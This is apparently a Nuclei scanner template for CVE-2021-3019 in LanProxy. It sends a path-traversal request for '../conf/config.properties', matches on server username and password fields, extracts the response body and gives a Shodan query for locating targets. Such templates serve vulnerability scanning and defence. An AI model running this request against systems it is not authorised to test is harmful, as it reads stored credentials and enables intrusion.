http:
- extractors:
  - dsl:
    - body
    name: config_content
    part: body
    type: dsl
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - 'Server: LPS'
  - condition: and
    type: word
    words:
    - config.server.username
    - config.server.password
  matchers-condition: and
  path:
  - '{{BaseURL}}/../conf/config.properties'
id: lanproxy-file-read
info:
  author: Esonhugh-self-maintained
  description: 'LanProxy is vulnerable to arbitrary file read via the send malformed
    request.

    '
  metadata:
    cve: CVE-2021-3019
    shodan-query: http.title:"LanProxy"
    verified: 'true'
  name: CVE-2021-3019  LanProxy - Arbitrary File Read
  severity: high
  tags: lanproxy,file-read,cve,lfi
